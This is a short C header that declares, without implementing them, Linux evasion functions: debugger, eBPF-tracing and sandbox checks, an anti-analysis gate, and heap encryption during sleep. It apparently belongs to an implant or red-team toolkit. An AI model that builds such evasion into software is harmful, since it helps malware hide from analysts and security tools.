#ifndef JAGER_LINUX_EVASION_H
#define JAGER_LINUX_EVASION_H

#include <stddef.h>

int check_ptrace(void);
int check_proc_status(void);
int check_ebpf_tracing(void);
int check_sandbox(void);
int anti_analysis_gate(void);

void track_allocation(void *addr, size_t size);
void untrack_allocation(void *addr);
void sleep_encrypt_heap(int sleep_ms);

#endif
